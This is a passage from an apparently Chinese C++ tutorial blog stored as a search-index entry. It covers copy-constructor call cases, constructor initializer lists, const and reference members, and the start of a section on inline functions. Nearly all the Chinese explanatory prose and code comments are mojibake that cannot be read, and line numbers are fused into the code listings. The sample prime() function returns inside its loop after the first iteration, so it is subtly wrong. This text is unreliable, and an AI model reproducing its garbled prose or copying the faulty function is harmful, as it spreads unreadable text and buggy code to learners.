t1(1); Test t0(2); t0 = t1; // æ™®é€šçš„èµ‹å€¼æ“ä½œï¼Œæ‹·è´æ„é€ å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨ Test t2 = t1; // ç±»çš„åˆå§‹åŒ–æ“ä½œ(ç­‰å·æ³•)ï¼Œæ‹·è´æ„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ cout &lt;&lt; "a = " &lt;&lt; t2.getA() &lt;&lt; endl;}int main() { functionA(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234567æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†a = 11ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº† ç¬¬äºŒç§è°ƒç”¨åœºæ™¯12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;using namespace std;class Test {private : int _a;public: Test() { cout &lt;&lt; "æ— å‚æ„é€ å‡½æ•°è‡ªåŠ¨è¢«è°ƒç”¨äº†" &lt;&lt; endl; } Test(int a) { _a = a; cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } Test(const Test &amp;obj) { _a = obj._a + 10; cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } int getA() { return _a; }};void functionA() { Test t1(3); Test t2(t1); // ç±»çš„åˆå§‹åŒ–æ“ä½œ(æ‹¬å·æ³•)ï¼Œæ‹·è´æ„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ cout &lt;&lt; "a = " &lt;&lt; t2.getA() &lt;&lt; endl;}int main() { functionA(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†a = 13ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº† ç¬¬ä¸‰ç§è°ƒç”¨åœºæ™¯12345678910111213141516171819202122232425262728293031323334353637383940414243#include "iostream"using namespace std;class Location {private : int X, Y;public: Location(int xx = 0, int yy = 0) { X = xx; Y = yy; cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } Location(const Location &amp;p) { X = p.X; Y = p.Y; cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } ~Location() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } int getX() { return X; } int getY() { return Y; }};void functionA(Location b) { cout &lt;&lt; b.getX() &lt;&lt; "," &lt;&lt; b.getY() &lt;&lt; endl;}int main() { Location a(1, 2); functionA(a); // æ‹·è´æ„é€ å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œè¿™é‡Œä¼šä½¿ç”¨å®å‚å˜é‡ï¼ˆaï¼‰åˆå§‹åŒ–å½¢å‚å˜é‡ï¼ˆbï¼‰ï¼ŒåŒæ—¶ä¼šå¤šåˆ›å»ºä¸€ä¸ªLocationå¯¹è±¡ï¼ˆåŒ¿åå¯¹è±¡ï¼‰ï¼Œæ‰€ä»¥æœ€åææ„å‡½æ•°ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†1,2ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº† ç¬¬å››ç§è°ƒç”¨åœºæ™¯1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;using namespace std;class Location {private : int x, y;public: Location(int xx = 0, int yy = 0) { x = xx; y = yy; cout &lt;&lt; "æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } Location(const Location &amp;p) { x = p.x; y = p.y; cout &lt;&lt; "æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } ~Location() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨äº†" &lt;&lt; endl; } int getX() { return x; } int getY() { return y; }};Location functionA() { Location l(1, 2); return l;}int main() { // åŒ¿åå¯¹è±¡çš„å»ä¸ç•™ï¼Œå…³é”®æ˜¯çœ‹è¿”å›åŒ¿åå¯¹è±¡æ—¶å¦‚ä½•æ¥æ”¶ï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸¤ç§æƒ…å†µï¼š // è‹¥å°†å‡½æ•°functionA()è¿”å›çš„åŒ¿åå¯¹è±¡ï¼Œèµ‹å€¼ç»™å¦å¤–ä¸€ä¸ªåŒç±»å‹çš„å¯¹è±¡ï¼Œé‚£ä¹ˆåŒ¿åå¯¹è±¡ä¼šè¢«ææ„ // æ­¤æ—¶æœ‰å‚æ„é€ å‡½æ•°å’Œææ„å‡½æ•°è¢«è°ƒç”¨ä¸¤æ¬¡ Location A; A = functionA(); // è‹¥ä½¿ç”¨å‡½æ•°functionA()çš„åŒ¿åå¯¹è±¡ï¼Œæ¥åˆå§‹åŒ–å¦å¤–ä¸€ä¸ªåŒç±»å‹çš„å¯¹è±¡ï¼Œé‚£ä¹ˆåŒ¿åå¯¹è±¡ä¼šç›´æ¥è½¬æˆBå¯¹è±¡ // æ­¤æ—¶æœ‰å‚æ„é€ å‡½æ•°ä¸ææ„å‡½æ•°å„è¢«è°ƒç”¨ä¸€æ¬¡ // Location B = functionA(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†æœ‰å‚æ„é€ å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº†ææ„å‡½æ•°è¢«è°ƒç”¨äº† æ€è€ƒï¼šåœ¨ä¸Šè¿°çš„ä»£ç ä¸­ï¼Œåœ¨ main() å‡½æ•°å†…ç›´æ¥è°ƒç”¨ functionA() å‡½æ•°æ—¶ï¼Œä¸ºä»€ä¹ˆæ‹·è´æ„é€ å‡½æ•°æ²¡æœ‰è¢«è°ƒç”¨å‘¢ï¼Ÿæ˜¯å¦è·Ÿ C++ ç¼–è¯‘å™¨çš„ç‰ˆæœ¬æœ‰å…³ç³»å‘¢ï¼Ÿ æ„é€ å‡½æ•°çš„ä½¿ç”¨è§„åˆ™ å½“ç±»ä¸­æ²¡æœ‰å®šä¹‰ä»»ä½•ä¸€ä¸ªæ„é€ å‡½æ•°æ—¶ï¼ŒC++ ç¼–è¯‘å™¨ä¼šæä¾›é»˜è®¤æ— å‚æ„é€ å‡½æ•°å’Œé»˜è®¤æ‹·è´æ„é€ å‡½æ•° å½“ç±»ä¸­å®šä¹‰äº†æ‹·è´æ„é€ å‡½æ•°æ—¶ï¼ŒC++ ç¼–è¯‘å™¨ä¸ä¼šæä¾›é»˜è®¤æ— å‚æ„é€ å‡½æ•° å½“ç±»ä¸­å®šä¹‰äº†ä»»æ„çš„éæ‹·è´æ„é€ å‡½æ•°ï¼ˆå³å½“ç±»ä¸­å®šä¹‰äº†æœ‰å‚æ„é€ å‡½æ•°æˆ–æ— å‚æ„é€ å‡½æ•°ï¼‰ï¼ŒC++ ç¼–è¯‘å™¨ä¸ä¼šæä¾›é»˜è®¤æ— å‚æ„é€ å‡½æ•° C++ æä¾›çš„é»˜è®¤æ‹·è´æ„é€ å‡½æ•°ï¼Œåªè´Ÿè´£ç»™ç±»æˆå‘˜å˜é‡ç®€å•èµ‹å€¼ å¿…è¦çš„æ—¶å€™ï¼Œéœ€è¦æ‰‹åŠ¨ç¼–å†™æ‹·è´æ„é€ å‡½æ•° æ„é€ å‡½æ•°å’Œæ™®é€šæˆå‘˜å‡½æ•°éƒ½éµå¾ªå‡½æ•°é‡è½½è§„åˆ™ æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨åˆå§‹åŒ–åˆ—è¡¨å‡ºç°çš„åŸå› æœ‰çš„æ—¶å€™å¿…é¡»ç”¨å¸¦æœ‰åˆå§‹åŒ–åˆ—è¡¨çš„æ„é€ å‡½æ•°ï¼šï¼ˆ1ï¼‰æ²¡æœ‰é»˜è®¤æ— å‚æ„é€ å‡½æ•°çš„æˆå‘˜ç±»å¯¹è±¡ï¼›ï¼ˆ2ï¼‰const æˆå‘˜æˆ–å¼•ç”¨ç±»å‹çš„æˆå‘˜ï¼Œå¿…é¡»è¦é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨è¿›è¡Œåˆå§‹åŒ–ï¼Œå› ä¸ºè¿™ä¸¤ç§å¯¹è±¡è¦åœ¨å£°æ˜åé©¬ä¸Šåˆå§‹åŒ–ï¼Œè€Œåœ¨æ„é€ å‡½æ•°ä¸­ï¼Œåšçš„å°±æ˜¯å¯¹å®ƒä»¬èµ‹å€¼ï¼Œè¿™æ ·æ˜¯ä¸è¢«å…è®¸çš„ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ„é€ å‡½æ•°ä¸­æœ‰ç€æ¯”æˆ‘ä»¬æ‰€çœ‹è§çš„è¿˜è¦å¤šçš„ç»†èŠ‚ï¼Œæ„é€ å‡½æ•°å¯ä»¥è°ƒç”¨å…¶å®ƒçš„æ„é€ å‡½æ•°æ¥åˆå§‹åŒ–å¯¹è±¡ä¸­çš„åŸºç±»å¯¹è±¡å’Œæˆå‘˜å¯¹è±¡çš„æ„é€ å‡½æ•°ã€‚ç±»çš„æ•°æ®æˆå‘˜ä¸­çš„å…¶å®ƒç±»å¯¹è±¡ï¼Œè‹¥è¯¥æˆå‘˜å¯¹è±¡æ˜¯æ²¡æœ‰é»˜è®¤æ— å‚æ„é€ å‡½æ•°ï¼Œåˆ™å¿…é¡»è¿›è¡Œæ˜¾å¼åˆå§‹åŒ–ï¼›å› ä¸ºç¼–è¯‘å™¨ä¼šéšå¼è°ƒç”¨æˆå‘˜å¯¹è±¡çš„é»˜è®¤æ— å‚æ„é€ å‡½æ•°ï¼Œè€Œå®ƒåˆæ²¡æœ‰é»˜è®¤æ— å‚æ„é€ å‡½æ•°ï¼Œåˆ™ç¼–è¯‘å™¨ä¼šç¼–è¯‘å¤±è´¥ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;using namespace std;class Teacher {private : int _age;public: Teacher(int age) { _age = age; } int getAge() const { return _age; }};class Student {private : int _age; Teacher teacher;public: int getAge() const { return _age; }};int main() { Teacher t(20); Student s; // C++ç¼–è¯‘å™¨ç¼–è¯‘ä¸é€šè¿‡ return 0;} ä¸Šè¿°ç¤ºä¾‹ä»£ç æ— æ³•é€šè¿‡ç¼–è¯‘ï¼ŒStudent çš„ç±»æ•°æ®æˆå‘˜ä¸­æœ‰ä¸€ä¸ª Teacher ç±»çš„å¯¹è±¡ teacherï¼Œåˆ›å»º Student ç±»æ—¶ï¼Œè¦å…ˆåˆ›å»ºå…¶æˆå‘˜å¯¹è±¡ teacherï¼›ç”±äº Teacher ç±»æœ‰ä¸€ä¸ªè‡ªå®šä¹‰çš„æœ‰å‚æ„é€ å‡½æ•°ï¼ŒC++ ç¼–è¯‘å™¨ä¸ä¼šå†æä¾›é»˜è®¤æ— å‚æ„é€ å‡½æ•°ï¼Œå› æ­¤ teacher å¯¹è±¡æ— æ³•è¢«è‡ªåŠ¨åˆ›å»ºã€‚ä½¿ç”¨æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨æ”¹å†™åï¼Œæ­£ç¡®çš„ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;class Teacher {private : int _age;public: Teacher(int age) { _age = age; } int getAge() const { return _age; }};class Student {private : int _age; Teacher teacher;public: // ä½¿ç”¨æ„é€ å‡½æ•°çš„åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ–Teacherç±»å¯¹è±¡ // è¿™é‡Œä¼šè‡ªåŠ¨è°ƒç”¨Teacherç±»çš„æœ‰å‚æ„é€ å‡½æ•°ï¼Œå¹¶å°†age2ä½œä¸ºæ„é€ å‡½æ•°çš„å‚æ•°ä¼ é€’è¿‡å» Student(int age1, int age2) : teacher(age2) { _age = age1; } int getAge() const { return _age; } Teacher getTeacher() { return teacher; }};int main() { Student s(20, 35); cout &lt;&lt; "student.age: " &lt;&lt; s.getAge() &lt;&lt; ", teacher.age: " &lt;&lt; s.getTeacher().getAge() &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œçš„è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1student.age: 20, teacher.age: 35 åˆå§‹åŒ–åˆ—è¡¨ä½¿ç”¨çš„è¯­æ³•è§„åˆ™æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨ä»¥ä¸€ä¸ªå†’å·å¼€å§‹ï¼Œæ¥ç€æ˜¯ä»¥é€—å·åˆ†éš”çš„æ•°æ®æˆå‘˜åˆ—è¡¨ï¼Œæ¯ä¸ªæ•°æ®æˆå‘˜åé¢è·Ÿä¸€ä¸ªæ”¾åœ¨æ‹¬å·ä¸­çš„åˆå§‹åŒ–å¼ã€‚ 1234Constructor::Contructor() : m1(v1), m2(v1,v2), m3(v3){} åœ¨ä¸‹è¿°çš„ç¤ºä¾‹ä»£ç ä¸­ï¼Œä¸¤ä¸ªæ„é€ å‡½æ•°çš„æœ€ç»ˆæ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨çš„æ„é€ å‡½æ•°æ˜¯æ˜¾å¼åœ°åˆå§‹åŒ–ç±»çš„æˆå‘˜ï¼›è€Œæ²¡æœ‰ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨çš„æ„é€ å‡½æ•°æ˜¯å¯¹ç±»çš„æˆå‘˜èµ‹å€¼ï¼Œå¹¶æ²¡æœ‰æ˜¾å¼åœ°åˆå§‹åŒ–ã€‚ 12345678910111213141516171819class A{public: int a; float b; A(): a(0),b(9.9) {} //æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨};class A{public: int a; float b; A() //æ„é€ å‡½æ•°å†…éƒ¨èµ‹å€¼ { a = 0; b = 9.9; }}; åˆå§‹åŒ– const æˆå‘˜å’Œå¼•ç”¨æˆå‘˜æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨æ˜¯åˆå§‹åŒ– const æˆå‘˜å’Œå¼•ç”¨æˆå‘˜çš„å”¯ä¸€æ–¹å¼ã€‚å› ä¸º const æˆå‘˜æˆ–å¼•ç”¨ç±»å‹çš„æˆå‘˜åªèƒ½è¢«åˆå§‹åŒ–ï¼Œä¸èƒ½å¯¹å®ƒä»¬èµ‹å€¼ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425#include &lt;iostream&gt;using namespace std;class A {private: int i; int &amp;j; const int c;public: // æ„é€ å‡½æ•°åˆå§‹åŒ–åˆ—è¡¨ A(int x, int y) : c(x), j(y) { i = -1; }};int main() { int m; A a(5, m); // C++ç¼–è¯‘å¯ä»¥é€šè¿‡ return 0;} è‹¥ä¸é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨æ¥å¯¹ const æˆå‘˜æˆ–å¼•ç”¨ç±»å‹çš„æˆå‘˜è¿›è¡Œåˆå§‹åŒ–ï¼Œé‚£ä¹ˆç¼ºçœæƒ…å†µä¸‹ï¼Œåœ¨æ„é€ å‡½æ•°è¢«æ‰§è¡Œä¹‹å‰ï¼Œå¯¹è±¡ä¸­çš„æ‰€æœ‰æˆå‘˜éƒ½å·²ç»è¢«å®ƒä»¬è‡ªå·±çš„é»˜è®¤æ— å‚æ„é€ å‡½æ•°åˆå§‹åŒ–äº†ã€‚ç”±äºè¿™ä¸¤ç§æ•°æ®æˆå‘˜è¦åœ¨å£°æ˜åé©¬ä¸Šåˆå§‹åŒ–ï¼Œè€Œåœ¨æ„é€ å‡½æ•°ä¸­ï¼Œåšçš„å°±æ˜¯å¯¹å®ƒä»¬èµ‹å€¼ï¼Œè¿™æ ·æ˜¯ä¸è¢«å…è®¸çš„ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223#include &lt;iostream&gt;using namespace std;class A {private: int i; int &amp;j; const int c;public: A(int x) { i = -1; c = 5; // C++ç¼–è¯‘ä¸é€šè¿‡ï¼Œå¿…é¡»é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ– j = x; // C++ç¼–è¯‘ä¸é€šè¿‡ï¼Œå¿…é¡»é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨æ¥åˆå§‹åŒ– }};int main() { A a(3); return 0;} å½“ç±»ä¸­æŸä¸ªæ•°æ®æˆå‘˜æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œåº”è¯¥å°½é‡é¿å…ä½¿ç”¨èµ‹å€¼æ“ä½œæ¥å¯¹è¯¥æˆå‘˜è¿›è¡Œåˆå§‹åŒ–ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011class Person{private: string name;public: Person(string &amp; n) { name = n; }} è™½ç„¶è¿™æ ·çš„æ„é€ å‡½æ•°ä¹Ÿèƒ½å¾—åˆ°æ­£ç¡®çš„ç»“æœï¼Œä½†è¿™æ ·å†™æ•ˆç‡å¹¶ä¸é«˜ã€‚å½“ä¸€ä¸ª Person å¯¹è±¡åˆ›å»ºæ—¶ï¼Œstring ç±»æˆå‘˜å¯¹è±¡ name å…ˆä¼šè¢«é»˜è®¤æ— å‚æ„é€ å‡½æ•°è¿›è¡Œåˆå§‹åŒ–ï¼Œç„¶ååœ¨ Person ç±»çš„è‡ªå®šä¹‰æœ‰å‚æ„é€ å‡½æ•°ä¸­ï¼Œå®ƒçš„å€¼åˆä¼šå› èµ‹å€¼æ“ä½œè€Œå†æ”¹å˜ä¸€æ¬¡ã€‚è¿™é‡Œå¯ä»¥é€šè¿‡åˆå§‹åŒ–åˆ—è¡¨æ¥æ˜¾ç¤ºåœ°å¯¹ name å¯¹è±¡è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™æ ·å°±å¯ä»¥å°†å‰é¢çš„ä¸¤æ­¥éª¤ï¼ˆåˆå§‹åŒ–å’Œèµ‹å€¼ï¼‰åˆå¹¶æˆä¸€ä¸ªæ­¥éª¤äº†ã€‚ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 12345678910class Person{private: string name;public: Person(string&amp; n): name(n){ }} åˆå§‹åŒ–ä¸èµ‹å€¼çš„åŒºåˆ«é‡ç‚¹çŸ¥è¯†ç‚¹ï¼š åˆå§‹åŒ–ï¼šè¢«åˆå§‹åŒ–çš„å¯¹è±¡æ­£åœ¨åˆ›å»º èµ‹å€¼ï¼šè¢«èµ‹å€¼çš„å¯¹è±¡å·²ç»å­˜åœ¨ åˆå§‹åŒ–åˆ—è¡¨ä¼˜å…ˆäºæ„é€ å‡½æ•°çš„æ‰§è¡Œ æˆå‘˜å˜é‡çš„åˆå§‹åŒ–é¡ºåºä¸å£°æ˜çš„é¡ºåºç›¸å…³ï¼Œä¸åœ¨åˆå§‹åŒ–åˆ—è¡¨ä¸­çš„é¡ºåºæ— å…³ åœ¨å®è§‚ä»£ç ä¸Šï¼Œä¸¤è€…ä½œç”¨ç›¸åŒã€‚å¯¹äºæ•°ç»„å’Œç»“æ„ä½“æ¥è¯´ï¼Œåˆå§‹åŒ–å’Œèµ‹å€¼çš„çš„å½¢å¼ä¸åŒã€‚å¯¹äºæ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨èŠ±æ‹¬å·ä¸€èµ·åˆå§‹åŒ–ï¼Œå¦‚æœèµ‹å€¼çš„è¯ï¼Œå°±åªèƒ½å•ä¸ªå…ƒç´ å°±è¡Œï¼›å¯¹äºç»“æ„ä½“ï¼Œå¯ä»¥ä½¿ç”¨èŠ±æ‹¬å·åˆå§‹åŒ–ï¼Œå¦åˆ™åªèƒ½é€šè¿‡ . æ¥è®¿é—®å˜é‡è¿›è¡Œèµ‹å€¼ã€‚ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;struct MyStruct { int aa; float bb; string cc;};int main() { int a[3] = {1, 2, 3}; int b[3]; b[0] = 1; b[1] = 2; b[2] = 3; MyStruct stu1 = {1, 3.14f, "hello world"}; MyStruct stu2; stu2.aa = 1; stu2.bb = 3.14f; stu2.cc = "we are csdn"; cout &lt;&lt; stu1.aa &lt;&lt; endl; cout &lt;&lt; stu1.bb &lt;&lt; endl; cout &lt;&lt; stu1.cc &lt;&lt; endl; return 0;} æ„é€ å‡½æ•°å’Œææ„å‡½æ•°çš„è°ƒç”¨é¡ºåº å½“ç±»ä¸­æœ‰æˆå‘˜å˜é‡æ˜¯å…¶å®ƒç±»çš„å¯¹è±¡æ—¶ï¼Œé¦–å…ˆè°ƒç”¨æˆå‘˜å˜é‡çš„æ„é€ å‡½æ•°ï¼Œè°ƒç”¨é¡ºåºä¸å£°æ˜é¡ºåºç›¸åŒï¼Œä¹‹åå†è°ƒç”¨ç±»è‡ªèº«çš„æ„é€ å‡½æ•° ææ„å‡½æ•°çš„è°ƒç”¨é¡ºåºä¸å¯¹åº”çš„æ„é€ å‡½æ•°è°ƒç”¨é¡ºåºç›¸å var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ å…¥é—¨åŸºç¡€ä¹‹ä¸‰",url:"/posts/f26087ad.html",text:'C++ å¯¹ C è¯­è¨€çš„å‡½æ•°æ‰©å±•å†…è”å‡½æ•°ä»€ä¹ˆæ˜¯å†…è”å‡½æ•°åœ¨ C è¯­è¨€ä¸­ï¼Œä½¿ç”¨å®å®šä¹‰å‡½æ•°è¿™ç§å€ŸåŠ©ç¼–è¯‘å™¨çš„ä¼˜åŒ–æŠ€æœ¯æ¥å‡å°‘ç¨‹åºçš„æ‰§è¡Œæ—¶é—´ï¼Œé‚£ä¹ˆåœ¨ C++ ä¸­æœ‰æ²¡æœ‰ç›¸åŒçš„æŠ€æœ¯æˆ–è€…æ›´å¥½çš„å®ç°æ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œé‚£å°±æ˜¯å†…è”å‡½æ•°ã€‚å†…è”å‡½æ•°ä½œä¸ºç¼–è¯‘å™¨ä¼˜åŒ–æ‰‹æ®µçš„ä¸€ç§æŠ€æœ¯ï¼Œåœ¨é™ä½ç¨‹åºè¿è¡Œæ—¶é—´ä¸Šéå¸¸æœ‰ç”¨ã€‚C++ çš„å†…è”å‡½æ•°æ˜¯é€šå¸¸ä¸ç±»ä¸€èµ·ä½¿ç”¨ã€‚å¦‚æœä¸€ä¸ªå‡½æ•°æ˜¯å†…è”çš„ï¼Œé‚£ä¹ˆåœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨ä¼šæŠŠè¯¥å‡½æ•°çš„ä»£ç å‰¯æœ¬æ”¾ç½®åœ¨æ¯ä¸ªè°ƒç”¨è¯¥å‡½æ•°çš„åœ°æ–¹ã€‚å¯¹å†…è”å‡½æ•°è¿›è¡Œä»»ä½•ä¿®æ”¹ï¼Œéƒ½éœ€è¦é‡æ–°ç¼–è¯‘å‡½æ•°çš„æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œå› ä¸ºç¼–è¯‘å™¨éœ€è¦é‡æ–°æ›´æ¢ä¸€æ¬¡æ‰€æœ‰çš„ä»£ç ï¼Œå¦åˆ™å°†ä¼šç»§ç»­ä½¿ç”¨æ—§çš„å‡½æ•°ã€‚å¦‚æœæƒ³æŠŠä¸€ä¸ªå‡½æ•°å®šä¹‰ä¸ºå†…è”å‡½æ•°ï¼Œåˆ™éœ€è¦åœ¨å‡½æ•°åå‰é¢æ”¾ç½®å…³é”®å­— inlineï¼Œåœ¨è°ƒç”¨å‡½æ•°ä¹‹å‰éœ€è¦å¯¹å‡½æ•°è¿›è¡Œå®šä¹‰ã€‚æ‰€æœ‰åœ¨ç±»ä¸­å®šä¹‰çš„å‡½æ•°éƒ½æ˜¯å†…è”å‡½æ•°ï¼Œå³ä½¿æ²¡æœ‰ä½¿ç”¨ inline å…³é”®å­—å£°æ˜ã€‚å½“å†…è”å‡½æ•°æ”¶åˆ°ç¼–è¯‘å™¨çš„æŒ‡ç¤ºæ—¶ï¼Œå³å¯å‘ç”Ÿå†…è”ï¼šç¼–è¯‘å™¨å°†ä½¿ç”¨å‡½æ•°çš„å®šä¹‰ä½“æ¥æ›¿ä»£å‡½æ•°è°ƒç”¨è¯­å¥ï¼Œè¿™ç§æ›¿ä»£è¡Œä¸ºå‘ç”Ÿåœ¨ç¼–è¯‘é˜¶æ®µè€Œéç¨‹åºè¿è¡Œé˜¶æ®µã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå†…è”å‡½æ•°ä»…ä»…æ˜¯å¯¹ç¼–è¯‘å™¨çš„å†…è”å»ºè®®ï¼Œç¼–è¯‘å™¨æ˜¯å¦è§‰å¾—é‡‡å–å»ºè®®å–å†³äºå‡½æ•°æ˜¯å¦ç¬¦åˆå†…è”çš„æœ‰åˆ©æ¡ä»¶ã€‚å¦‚ä½•å‡½æ•°ä½“éå¸¸å¤§ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å°†å¿½ç•¥å‡½æ•°çš„å†…è”å£°æ˜ï¼Œè€Œå°†å†…è”å‡½æ•°ä½œä¸ºæ™®é€šå‡½æ•°å¤„ç†ã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å†…è”å‡½æ•°æœ‰æ—¶å€™æˆ‘ä»¬ä¼šå†™ä¸€äº›åŠŸèƒ½ä¸“ä¸€çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°çš„å‡½æ•°ä½“ä¸å¤§ï¼ŒåŒ…å«äº†å¾ˆå°‘çš„æ‰§è¡Œè¯­å¥ã€‚ä¾‹å¦‚åœ¨è®¡ç®— 1~1000 ä»¥å†…çš„ç´ æ•°æ—¶ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šä½¿ç”¨å¼€æ–¹æ“ä½œä½¿è¿ç®—èŒƒå›´ç¼©å°ï¼Œè¿™æ—¶æˆ‘ä»¬ä¼šå†™å¦‚ä¸‹ä¸€ä¸ªå‡½æ•°ï¼š 1234int root(int n){ return (int)sqrt((float)n);} ç„¶åæ±‚èŒƒå›´å†…ç´ æ•°çš„å‡½æ•°å¯ä»¥è¿™æ ·å†™ï¼š 12345678910int prime(int n){ int i; for (i = 2; i &lt;= root(n); i++) { if (n%i == 0) return 0; return 1; }} å½“ç„¶ï¼ŒæŠŠ root å‡½æ•°æ”¾åœ¨å¾ªç¯ä¸­ä¸æ˜¯ä¸ªä¸æ˜æ™ºçš„é€‰æ‹©ï¼Œä½†æƒ³è±¡ä¸€ä¸‹ï¼Œåœ¨æŸä¸ªç¨‹åºä¸Šä¸‹æ–‡å†…å¿…é¡»é¢‘ç¹åœ°è°ƒç”¨æŸä¸ªç±»ä¼¼ root çš„å‡½æ•°ï¼Œå…¶è°ƒç”¨å‡½æ•°çš„èŠ±é”€ä¼šæœ‰å¤šå¤§ï¼šå½“é‡åˆ°æ™®é€šå‡½æ•°çš„è°ƒç”¨æŒ‡ä»¤æ—¶ï¼Œç¨‹åºä¼šä¿å­˜å½“å‰å‡½æ•°çš„æ‰§è¡Œç°åœºï¼Œå°†å‡½æ•°ä¸­çš„å±€éƒ¨å˜é‡ä»¥åŠå‡½æ•°åœ°å€å‹å…¥å †æ ˆï¼Œç„¶åå†å°†å³å°†è°ƒç”¨çš„æ–°å‡½æ•°åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè¿™è¦ç»å†å¤åˆ¶å‚æ•°å€¼ã€è·³è½¬åˆ°æ‰€è°ƒç”¨å‡½æ•°çš„å†…å­˜ä½ç½®ã€æ‰§è¡Œå‡½æ•°ä»£ç 